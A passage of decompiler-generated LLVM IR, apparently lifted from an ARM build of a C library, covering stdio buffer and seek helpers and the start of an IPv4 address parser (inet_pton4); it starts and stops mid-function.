dec_label_pc_1b330:                               ; preds = %entry
  %v1_1b330 = icmp slt i32 %arg2, 0
  br i1 %v1_1b330, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_1b330
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_1b330, %bb18
  %v1_1b338 = add i32 %v0_1b318, 4
  %v2_1b338 = inttoptr i32 %v1_1b338 to i32*
  %v3_1b338 = load i32, i32* %v2_1b338, align 4
  store i32 %v3_1b338, i32* %r0.global-to-local, align 4
  %v1_1b33c = call i32 @__GI_read(i32 %v3_1b338)
  store i32 %v1_1b33c, i32* %r0.global-to-local, align 4
  %v5_1b344 = icmp sgt i32 %v1_1b33c, 0
  br i1 %v5_1b344, label %.thread7, label %dec_label_pc_1b348

dec_label_pc_1b348:                               ; preds = %bb19
  %v2_1b340 = icmp eq i32 %v1_1b33c, 0
  %v0_1b348 = load i32, i32* %r4.global-to-local, align 4
  %v1_1b348 = inttoptr i32 %v0_1b348 to i16*
  %v2_1b348 = load i16, i16* %v1_1b348, align 2
  br i1 %v2_1b340, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_1b348
  %v2_1b34c = or i16 %v2_1b348, 4
  store i16 %v2_1b34c, i16* %v1_1b348, align 2
  %v1_1b368.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_1b348
  %v2_1b350 = or i16 %v2_1b348, 8
  store i16 %v2_1b350, i16* %v1_1b348, align 2
  %v1_1b35c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_1b35c, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_1b368 = phi i32 [ %v1_1b368.pre, %bb20 ], [ 0, %bb ], [ %v1_1b33c, %bb19 ], [ %v1_1b35c, %bb21 ]
  %v2_1b364 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1b364, i32* @r4, align 4
  ret i32 %v1_1b368

; uselistorder directives
  uselistorder i16 %v2_1b348, { 1, 0 }
  uselistorder i32 %v1_1b33c, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__GI_read, { 1, 0 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1b36c = load i32, i32* @r4, align 4
  store i32 %v3_1b36c, i32* %stack_var_-12, align 4
  %v3_1b370 = load i16, i16* %arg1, align 2
  %v4_1b370 = zext i16 %v3_1b370 to i32
  store i32 %v4_1b370, i32* @ip, align 4
  %tmp17 = urem i16 %v3_1b370, 4
  %v1_1b374 = zext i16 %tmp17 to i32
  store i32 %v1_1b374, i32* %r2.global-to-local, align 4
  %v2_1b374 = icmp eq i16 %tmp17, 0
  br i1 %v2_1b374, label %bb, label %dec_label_pc_1b388

bb:                                               ; preds = %entry
  br label %bb14

dec_label_pc_1b388:                               ; preds = %entry
  %v1_1b388 = add nsw i32 %v1_1b374, -1
  %v7_1b388 = icmp eq i16 %tmp17, 1
  br i1 %v7_1b388, label %bb14, label %dec_label_pc_1b390

dec_label_pc_1b390:                               ; preds = %dec_label_pc_1b388
  %v1_1b390 = and i32 %v4_1b370, 2048
  %v2_1b390 = icmp eq i32 %v1_1b390, 0
  br i1 %v2_1b390, label %bb14, label %dec_label_pc_1b398

dec_label_pc_1b398:                               ; preds = %dec_label_pc_1b390
  %v7_1b398 = icmp eq i32 %v1_1b388, 2
  br i1 %v7_1b398, label %dec_label_pc_1b41c, label %dec_label_pc_1b3a0

dec_label_pc_1b3a0:                               ; preds = %dec_label_pc_1b398
  %v2_1b3a0 = add i32 %tmp, 40
  %v3_1b3a0 = inttoptr i32 %v2_1b3a0 to i32*
  %v4_1b3a0 = load i32, i32* %v3_1b3a0, align 4
  store i32 %v4_1b3a0, i32* %r3.global-to-local, align 4
  %v2_1b3a4 = icmp eq i32 %v4_1b3a0, 0
  br i1 %v2_1b3a4, label %dec_label_pc_1b3ac, label %dec_label_pc_1b41c

dec_label_pc_1b3ac:                               ; preds = %dec_label_pc_1b3a0
  %v2_1b3ac = add i32 %tmp, 44
  %v3_1b3ac = inttoptr i32 %v2_1b3ac to i32*
  %v4_1b3ac = load i32, i32* %v3_1b3ac, align 4
  store i32 %v4_1b3ac, i32* %r3.global-to-local, align 4
  %v2_1b3b0 = add i32 %tmp, 3
  %v3_1b3b0 = inttoptr i32 %v2_1b3b0 to i8*
  %v4_1b3b0 = load i8, i8* %v3_1b3b0, align 1
  %v5_1b3b0 = zext i8 %v4_1b3b0 to i32
  store i32 %v5_1b3b0, i32* %r2.global-to-local, align 4
  %v2_1b3b4 = icmp eq i32 %v4_1b3ac, 0
  br i1 %v2_1b3b4, label %.thread1, label %bb13

.thread1:                                         ; preds = %dec_label_pc_1b3ac
  %v1_1b3bc3 = sub nsw i32 0, %v5_1b3b0
  br label %bb14

bb13:                                             ; preds = %dec_label_pc_1b3ac
  %v3_1b3b8 = add i32 %tmp, 2
  %v4_1b3b8 = inttoptr i32 %v3_1b3b8 to i8*
  %v5_1b3b8 = load i8, i8* %v4_1b3b8, align 1
  %v6_1b3b8 = zext i8 %v5_1b3b8 to i32
  store i32 %v6_1b3b8, i32* %r3.global-to-local, align 4
  %sum = add nuw nsw i32 %v6_1b3b8, %v5_1b3b0
  %v3_1b3c0 = sub nsw i32 0, %sum
  br label %bb14

bb14:                                             ; preds = %bb, %.thread1, %dec_label_pc_1b390, %dec_label_pc_1b388, %bb13
  %v1_1b3d4 = phi i32 [ %v1_1b3bc3, %.thread1 ], [ %v1_1b388, %dec_label_pc_1b390 ], [ %v1_1b388, %dec_label_pc_1b388 ], [ 0, %bb ], [ %v3_1b3c0, %bb13 ]
  %v1_1b3c4 = and i32 %v4_1b370, 64
  %v2_1b3c4 = icmp eq i32 %v1_1b3c4, 0
  %v2_1b3c8 = add i32 %tmp, 16
  %v3_1b3c8 = inttoptr i32 %v2_1b3c8 to i32*
  %v4_1b3c8 = load i32, i32* %v3_1b3c8, align 4
  store i32 %v4_1b3c8, i32* %r3.global-to-local, align 4
  %storemerge.in.in.v = select i1 %v2_1b3c4, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_1b3d4 = sub i32 %v1_1b3d4, %v4_1b3c8
  store i32 %v2_1b3d4, i32* %r3.global-to-local, align 4
  %v1_1b3d8 = inttoptr i32 %arg2 to i32*
  %v2_1b3d8 = load i32, i32* %v1_1b3d8, align 4
  store i32 %v2_1b3d8, i32* %r0.global-to-local, align 4
  %v3_1b3d8 = add i32 %arg2, 4
  %v4_1b3d8 = inttoptr i32 %v3_1b3d8 to i32*
  %v5_1b3d8 = load i32, i32* %v4_1b3d8, align 4
  %v2_1b3dc = add i32 %storemerge, %v2_1b3d4
  store i32 %v2_1b3dc, i32* %r4.global-to-local, align 4
  %v2_1b3e0 = sub i32 %v2_1b3d8, %v2_1b3dc
  store i32 %v2_1b3e0, i32* %r2.global-to-local, align 4
  %v2_1b3e4 = and i32 %v2_1b3dc, 1073741824
  %v3_1b3e4 = icmp ne i32 %v2_1b3e4, 0
  %v4_1b3e4 = ashr i32 %v2_1b3dc, 31
  %v6_1b3e4 = icmp eq i1 %v3_1b3e4, false
  %v7_1b3e4 = sub i32 %v5_1b3d8, %v4_1b3e4
  %v9_1b3e4 = sext i1 %v6_1b3e4 to i32
  %v10_1b3e4 = add i32 %v7_1b3e4, %v9_1b3e4
  store i32 %v10_1b3e4, i32* %r3.global-to-local, align 4
  %v2_1b3e8 = sub i32 %v10_1b3e4, %v5_1b3d8
  %v4_1b3e8 = xor i32 %v10_1b3e4, %v5_1b3d8
  %v5_1b3e8 = xor i32 %v2_1b3e8, %v10_1b3e4
  %v6_1b3e8 = and i32 %v5_1b3e8, %v4_1b3e8
  %v7_1b3e8 = icmp slt i32 %v6_1b3e8, 0
  %v8_1b3e8 = icmp slt i32 %v2_1b3e8, 0
  %v9_1b3e8 = icmp eq i32 %v10_1b3e4, %v5_1b3d8
  store i32 %v2_1b3e0, i32* %v1_1b3d8, align 4
  %v5_1b3ec = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_1b3ec, i32* %v4_1b3d8, align 4
  %v3_1b3f0 = xor i1 %v8_1b3e8, %v7_1b3e8
  %v4_1b3f0 = or i1 %v9_1b3e8, %v3_1b3f0
  br i1 %v4_1b3f0, label %dec_label_pc_1b3f4, label %dec_label_pc_1b400

dec_label_pc_1b3f4:                               ; preds = %bb14
  br i1 %v9_1b3e8, label %dec_label_pc_1b3f8, label %dec_label_pc_1b404thread-pre-split

dec_label_pc_1b3f8:                               ; preds = %dec_label_pc_1b3f4
  %v0_1b3f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b3f8 = load i32, i32* %r0.global-to-local, align 4
  %tmp18 = icmp ugt i32 %v0_1b3f8, %v1_1b3f8
  br i1 %tmp18, label %dec_label_pc_1b400, label %dec_label_pc_1b404thread-pre-split

dec_label_pc_1b400:                               ; preds = %dec_label_pc_1b3f8, %bb14
  %v0_1b400 = load i32, i32* %r4.global-to-local, align 4
  %v1_1b400 = sub i32 0, %v0_1b400
  store i32 %v1_1b400, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b404

dec_label_pc_1b404thread-pre-split:               ; preds = %dec_label_pc_1b3f8, %dec_label_pc_1b3f4
  %v0_1b404.pr = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b404

dec_label_pc_1b404:                               ; preds = %dec_label_pc_1b404thread-pre-split, %dec_label_pc_1b400
  %v0_1b404 = phi i32 [ %v0_1b404.pr, %dec_label_pc_1b404thread-pre-split ], [ %v1_1b400, %dec_label_pc_1b400 ]
  %v1_1b404 = icmp slt i32 %v0_1b404, 0
  br i1 %v1_1b404, label %dec_label_pc_1b40c, label %dec_label_pc_1b420

dec_label_pc_1b40c:                               ; preds = %dec_label_pc_1b404
  %v0_1b40c = call i32 @__GI___errno_location()
  store i32 %v0_1b40c, i32* %r0.global-to-local, align 4
  store i32 75, i32* %r3.global-to-local, align 4
  %v2_1b414 = inttoptr i32 %v0_1b40c to i32*
  store i32 75, i32* %v2_1b414, align 4
  %v0_1b420.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b420

dec_label_pc_1b41c:                               ; preds = %dec_label_pc_1b3a0, %dec_label_pc_1b398
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b420

dec_label_pc_1b420:                               ; preds = %dec_label_pc_1b404, %dec_label_pc_1b40c, %dec_label_pc_1b41c
  %v0_1b420 = phi i32 [ %v0_1b404, %dec_label_pc_1b404 ], [ %v0_1b420.pre, %dec_label_pc_1b40c ], [ -1, %dec_label_pc_1b41c ]
  store i32 %v0_1b420, i32* %r0.global-to-local, align 4
  %v2_1b428 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1b428, i32* @r4, align 4
  ret i32 %v0_1b420

; uselistorder directives
  uselistorder i32 %v0_1b420, { 1, 0 }
  uselistorder i1 %v9_1b3e8, { 1, 0 }
  uselistorder i32 %v2_1b3e8, { 1, 0 }
  uselistorder i32 %v10_1b3e4, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_1b3d8, { 2, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 0 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1b420, { 2, 1, 0 }
  uselistorder label %bb14, { 4, 1, 2, 3, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1b430 = load i32, i32* @r4, align 4
  store i32 %v3_1b430, i32* %stack_var_-8, align 4
  %v1_1b434 = add i32 %arg1, 8
  %v1_1b438 = inttoptr i32 %v1_1b434 to i32*
  %v2_1b438 = load i32, i32* %v1_1b438, align 4
  %v3_1b438 = add i32 %arg1, 12
  %v4_1b438 = inttoptr i32 %v3_1b438 to i32*
  %v5_1b438 = load i32, i32* %v4_1b438, align 4
  %v2_1b43c = sub i32 %v5_1b438, %v2_1b438
  store i32 %v2_1b43c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_1b444 = inttoptr i32 %arg1 to i16*
  %v4_1b444 = call i32 @__stdio_READ(i16* %v3_1b444, i32 %v2_1b438, i32 %v2_1b43c)
  %v0_1b448 = load i32, i32* @r4, align 4
  %v1_1b448 = add i32 %v0_1b448, 8
  %v2_1b448 = inttoptr i32 %v1_1b448 to i32*
  %v3_1b448 = load i32, i32* %v2_1b448, align 4
  store i32 %v3_1b448, i32* %r2.global-to-local, align 4
  %v2_1b44c = add i32 %v3_1b448, %v4_1b444
  %v2_1b450 = add i32 %v0_1b448, 20
  %v3_1b450 = inttoptr i32 %v2_1b450 to i32*
  store i32 %v2_1b44c, i32* %v3_1b450, align 4
  %v0_1b454 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b454 = load i32, i32* @r4, align 4
  %v2_1b454 = add i32 %v1_1b454, 16
  %v3_1b454 = inttoptr i32 %v2_1b454 to i32*
  store i32 %v0_1b454, i32* %v3_1b454, align 4
  %v2_1b458 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1b458, i32* @r4, align 4
  ret i32 %v4_1b444

; uselistorder directives
  uselistorder i32 %v4_1b444, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1b460 = load i32, i32* @r4, align 4
  store i32 %v3_1b460, i32* %stack_var_-12, align 4
  %v0_1b464 = load i32, i32* @r0, align 4
  %v1_1b464 = inttoptr i32 %v0_1b464 to i16*
  %v2_1b464 = load i16, i16* %v1_1b464, align 2
  %v3_1b464 = zext i16 %v2_1b464 to i32
  store i32 %v3_1b464, i32* %r3.global-to-local, align 4
  %v0_1b468 = load i32, i32* @r1, align 4
  %v2_1b468 = and i32 %v0_1b468, %v3_1b464
  %v4_1b468 = icmp eq i32 %v2_1b468, 0
  store i32 %v0_1b464, i32* @r4, align 4
  br i1 %v4_1b468, label %dec_label_pc_1b478, label %dec_label_pc_1b488

dec_label_pc_1b478:                               ; preds = %entry
  %v1_1b478 = and i32 %v3_1b464, 2176
  %v2_1b478 = icmp eq i32 %v1_1b478, 0
  br i1 %v2_1b478, label %dec_label_pc_1b480, label %dec_label_pc_1b494

dec_label_pc_1b480:                               ; preds = %dec_label_pc_1b478
  %v2_1b480 = or i32 %v0_1b468, %v3_1b464
  store i32 %v2_1b480, i32* %r3.global-to-local, align 4
  %v1_1b484 = trunc i32 %v2_1b480 to i16
  store i16 %v1_1b484, i16* %v1_1b464, align 2
  %v0_1b488.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1b488

dec_label_pc_1b488:                               ; preds = %entry, %dec_label_pc_1b480
  %v0_1b488 = phi i32 [ %v0_1b464, %entry ], [ %v0_1b488.pre, %dec_label_pc_1b480 ]
  %v1_1b488 = inttoptr i32 %v0_1b488 to i16*
  %v2_1b488 = load i16, i16* %v1_1b488, align 2
  %v3_1b488 = zext i16 %v2_1b488 to i32
  store i32 %v3_1b488, i32* %r3.global-to-local, align 4
  %v1_1b48c = and i32 %v3_1b488, 16
  store i32 %v1_1b48c, i32* %r5.global-to-local, align 4
  %v2_1b48c = icmp eq i32 %v1_1b48c, 0
  br i1 %v2_1b48c, label %dec_label_pc_1b4b4, label %dec_label_pc_1b494

dec_label_pc_1b494:                               ; preds = %dec_label_pc_1b478, %dec_label_pc_1b488
  %v0_1b494 = call i32 @__GI___errno_location()
  store i32 %v0_1b494, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1b49c = inttoptr i32 %v0_1b494 to i32*
  store i32 9, i32* %v2_1b49c, align 4
  br label %dec_label_pc_1b4a0

dec_label_pc_1b4a0:                               ; preds = %dec_label_pc_1b4bc, %dec_label_pc_1b494
  %v0_1b4a0 = load i32, i32* @r4, align 4
  %v1_1b4a0 = inttoptr i32 %v0_1b4a0 to i16*
  %v2_1b4a0 = load i16, i16* %v1_1b4a0, align 2
  %v3_1b4a0 = zext i16 %v2_1b4a0 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1b4a8 = or i32 %v3_1b4a0, 8
  store i32 %v1_1b4a8, i32* %r3.global-to-local, align 4
  %v1_1b4ac = trunc i32 %v1_1b4a8 to i16
  store i16 %v1_1b4ac, i16* %v1_1b4a0, align 2
  %v1_1b4f4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b4ec

dec_label_pc_1b4b4:                               ; preds = %dec_label_pc_1b488
  %v1_1b4b4 = and i32 %v3_1b488, 64
  %v2_1b4b4 = icmp eq i32 %v1_1b4b4, 0
  br i1 %v2_1b4b4, label %dec_label_pc_1b4dc, label %dec_label_pc_1b4bc

dec_label_pc_1b4bc:                               ; preds = %dec_label_pc_1b4b4
  %v0_1b4bc = call i32 @__stdio_wcommit()
  store i32 %v0_1b4bc, i32* %r0.global-to-local, align 4
  %v2_1b4c0 = icmp eq i32 %v0_1b4bc, 0
  br i1 %v2_1b4c0, label %dec_label_pc_1b4c8, label %dec_label_pc_1b4a0

dec_label_pc_1b4c8:                               ; preds = %dec_label_pc_1b4bc
  %v0_1b4c8 = load i32, i32* @r4, align 4
  %v1_1b4c8 = inttoptr i32 %v0_1b4c8 to i16*
  %v2_1b4c8 = load i16, i16* %v1_1b4c8, align 2
  %v3_1b4c8 = zext i16 %v2_1b4c8 to i32
  store i32 %v3_1b4c8, i32* %r3.global-to-local, align 4
  %v1_1b4cc = add i32 %v0_1b4c8, 8
  %v2_1b4cc = inttoptr i32 %v1_1b4cc to i32*
  %v3_1b4cc = load i32, i32* %v2_1b4cc, align 4
  %v1_1b4d0 = and i32 %v3_1b4c8, 65471
  store i32 %v1_1b4d0, i32* %r3.global-to-local, align 4
  %v2_1b4d4 = add i32 %v0_1b4c8, 28
  %v3_1b4d4 = inttoptr i32 %v2_1b4d4 to i32*
  store i32 %v3_1b4cc, i32* %v3_1b4d4, align 4
  %v0_1b4d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b4d8 = trunc i32 %v0_1b4d8 to i16
  %v2_1b4d8 = load i32, i32* @r4, align 4
  %v3_1b4d8 = inttoptr i32 %v2_1b4d8 to i16*
  store i16 %v1_1b4d8, i16* %v3_1b4d8, align 2
  %v0_1b4dc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1b4dc

dec_label_pc_1b4dc:                               ; preds = %dec_label_pc_1b4b4, %dec_label_pc_1b4c8
  %v2_1b4e4 = phi i32 [ %v0_1b488, %dec_label_pc_1b4b4 ], [ %v0_1b4dc.pre, %dec_label_pc_1b4c8 ]
  %v1_1b4dc = inttoptr i32 %v2_1b4e4 to i16*
  %v2_1b4dc = load i16, i16* %v1_1b4dc, align 2
  %v3_1b4dc = zext i16 %v2_1b4dc to i32
  %v1_1b4e0 = or i32 %v3_1b4dc, 1
  store i32 %v1_1b4e0, i32* %r3.global-to-local, align 4
  %v1_1b4e4 = trunc i32 %v1_1b4e0 to i16
  store i16 %v1_1b4e4, i16* %v1_1b4dc, align 2
  %v0_1b4e8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1b4e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b4ec

dec_label_pc_1b4ec:                               ; preds = %dec_label_pc_1b4a0, %dec_label_pc_1b4dc
  %v1_1b4f4 = phi i32 [ %v1_1b4f4.pre, %dec_label_pc_1b4a0 ], [ %v0_1b4e8, %dec_label_pc_1b4dc ]
  %v2_1b4f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1b4f0, i32* @r4, align 4
  ret i32 %v1_1b4f4

; uselistorder directives
  uselistorder i32 %v3_1b464, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder label %dec_label_pc_1b4ec, { 1, 0 }
  uselistorder label %dec_label_pc_1b4dc, { 1, 0 }
  uselistorder label %dec_label_pc_1b494, { 1, 0 }
  uselistorder label %dec_label_pc_1b488, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_1b504 = load i32, i32* %arg2, align 4
  %v3_1b504 = add i32 %tmp, 4
  %v4_1b504 = inttoptr i32 %v3_1b504 to i32*
  %v5_1b504 = load i32, i32* %v4_1b504, align 4
  %v1_1b508 = add i32 %arg1, 4
  %v2_1b508 = inttoptr i32 %v1_1b508 to i32*
  %v3_1b508 = load i32, i32* %v2_1b508, align 4
  store i32 %tmp, i32* @r4, align 4
  %v4_1b510 = call i32 @__GI_lseek64(i32 %v3_1b508, i32 %tmp, i32 %v2_1b504, i32 %v5_1b504)
  %v1_1b514 = icmp slt i32* %arg2, null
  br i1 %v1_1b514, label %bb13, label %bb

bb:                                               ; preds = %entry
  %v3_1b51c5 = load i32, i32* @r4, align 4
  %v4_1b51c6 = inttoptr i32 %v3_1b51c5 to i32*
  store i32 %v4_1b510, i32* %v4_1b51c6, align 4
  %v6_1b51c7 = add i32 %v3_1b51c5, 4
  %v7_1b51c8 = inttoptr i32 %v6_1b51c7 to i32*
  store i32 %tmp, i32* %v7_1b51c8, align 4
  br label %bb13

bb13:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v4_1b510, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder i32* null, { 2, 0, 3, 4, 1, 6, 7, 8, 9, 10, 11, 13, 14, 12, 15, 16, 17, 18, 24, 25, 22, 23, 21, 20, 19, 26, 27, 28, 5 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1b534 = load i32, i32* @r4, align 4
  %v6_1b534 = load i32, i32* @r5, align 4
  %v15_1b534 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 0, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v2_1b54c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1b54c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-28, align 4
  %v0_1b5c41 = load i32, i32* @r0, align 4
  %v1_1b5c42 = inttoptr i32 %v0_1b5c41 to i8*
  %v2_1b5c43 = load i8, i8* %v1_1b5c42, align 1
  %v3_1b5c44 = zext i8 %v2_1b5c43 to i32
  store i32 %v3_1b5c44, i32* @r3, align 4
  %v2_1b5c85 = icmp eq i8 %v2_1b5c43, 0
  store i1 %v2_1b5c85, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b5c85, label %dec_label_pc_1b5d4, label %dec_label_pc_1b564

dec_label_pc_1b564:                               ; preds = %entry, %dec_label_pc_1b5c4.backedge
  %v0_1b568 = phi i32 [ %v0_1b5c4, %dec_label_pc_1b5c4.backedge ], [ %v0_1b5c41, %entry ]
  %v0_1b5a0 = phi i32 [ %v3_1b5c4, %dec_label_pc_1b5c4.backedge ], [ %v3_1b5c44, %entry ]
  %v2_1b574.in = phi i32 [ %v3_1b5c4, %dec_label_pc_1b5c4.backedge ], [ %v3_1b5c44, %entry ]
  %v2_1b574 = add nsw i32 %v2_1b574.in, -48
  %v2_1b564 = icmp ugt i32 %v2_1b574, 8
  %v7_1b564 = icmp eq i32 %v2_1b574, 9
  store i1 %v7_1b564, i1* %cpsr_z.global-to-local, align 1
  %v1_1b568 = add i32 %v0_1b568, 1
  store i32 %v1_1b568, i32* %r0.global-to-local, align 4
  %v2_1b56c = xor i1 %v7_1b564, true
  %v3_1b56c = and i1 %v2_1b564, %v2_1b56c
  br i1 %v3_1b56c, label %dec_label_pc_1b5a0, label %dec_label_pc_1b570

dec_label_pc_1b570:                               ; preds = %dec_label_pc_1b564
  %v0_1b570 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b570 = inttoptr i32 %v0_1b570 to i8*
  %v2_1b570 = load i8, i8* %v1_1b570, align 1
  %v3_1b570 = zext i8 %v2_1b570 to i32
  %v0_1b574 = load i32, i32* %r7.global-to-local, align 4
  %v3_1b574 = mul i32 %v0_1b574, %v3_1b570
  %v4_1b574 = add i32 %v3_1b574, %v2_1b574
  store i32 %v4_1b574, i32* @r3, align 4
  %v2_1b578 = icmp ugt i32 %v4_1b574, 254
  %v7_1b578 = icmp eq i32 %v4_1b574, 255
  store i1 %v7_1b578, i1* %cpsr_z.global-to-local, align 1
  %v2_1b57c = xor i1 %v7_1b578, true
  %v3_1b57c = and i1 %v2_1b578, %v2_1b57c
  br i1 %v3_1b57c, label %dec_label_pc_1b5f8, label %dec_label_pc_1b580

dec_label_pc_1b580:                               ; preds = %dec_label_pc_1b570
  %v0_1b580 = load i32, i32* @lr, align 4
  %v2_1b580 = icmp eq i32 %v0_1b580, 0
  store i1 %v2_1b580, i1* %cpsr_z.global-to-local, align 1
  %v1_1b584 = trunc i32 %v4_1b574 to i8
  store i8 %v1_1b584, i8* %v1_1b570, align 1
  %v0_1b588 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b588, label %dec_label_pc_1b58c, label %dec_label_pc_1b5c4.backedge

dec_label_pc_1b58c:                               ; preds = %dec_label_pc_1b580
  %v0_1b58c = load i32, i32* @ip, align 4
  %v1_1b58c = add i32 %v0_1b58c, 1
  store i32 %v1_1b58c, i32* @ip, align 4
  %v7_1b590 = icmp eq i32 %v1_1b58c, 4
  store i1 %v7_1b590, i1* %cpsr_z.global-to-local, align 1
  %v0_1b594 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1b594, i32* @lr, align 4
  %v8_1b598 = icmp sgt i32 %v1_1b58c, 4
  br i1 %v8_1b598, label %dec_label_pc_1b5f8, label %dec_label_pc_1b5c4.backedge

dec_label_pc_1b5a0:                               ; preds = %dec_label_pc_1b564
  %v7_1b5a0 = icmp eq i32 %v0_1b5a0, 46
  %v1_1b5a8 = load i32, i32* @lr, align 4
  %v2_1b5a8 = urem i32 %v1_1b5a8, 2
  %storemerge12 = select i1 %v7_1b5a0, i32 %v2_1b5a8, i32 0
  store i32 %storemerge12, i32* @r3, align 4
  %v2_1b5ac = icmp eq i32 %storemerge12, 0
  store i1 %v2_1b5ac, i1* %cpsr_z.global-to-local, align 1
  %v0_1b5b0 = load i32, i32* @r5, align 4
  store i32 %v0_1b5b0, i32* @lr, align 4
  br i1 %v2_1b5ac, label %dec_label_pc_1b5f8, label %dec_label_pc_1b5b8

dec_label_pc_1b5b8:                               ; preds = %dec_label_pc_1b5a0
  %v0_1b5b8 = load i32, i32* @ip, align 4
  %v7_1b5b8 = icmp eq i32 %v0_1b5b8, 4
  store i1 %v7_1b5b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b5b8, label %dec_label_pc_1b5f8, label %dec_label_pc_1b5c0

dec_label_pc_1b5c0:                               ; preds = %dec_label_pc_1b5b8
  %v1_1b5c0 = trunc i32 %v0_1b5b0 to i8
  %v2_1b5c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_1b5c0 = add i32 %v2_1b5c0, 1
  %v4_1b5c0 = inttoptr i32 %v3_1b5c0 to i8*
  store i8 %v1_1b5c0, i8* %v4_1b5c0, align 1
  %v5_1b5c0 = load i32, i32* %r1.global-to-local, align 4
  %v6_1b5c0 = add i32 %v5_1b5c0, 1
  store i32 %v6_1b5c0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b5c4.backedge

dec_label_pc_1b5c4.backedge:                      ; preds = %dec_label_pc_1b5c0, %dec_label_pc_1b580, %dec_label_pc_1b58c
  %v0_1b5c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b5c4 = inttoptr i32 %v0_1b5c4 to i8*
  %v2_1b5c4 = load i8, i8* %v1_1b5c4, align 1
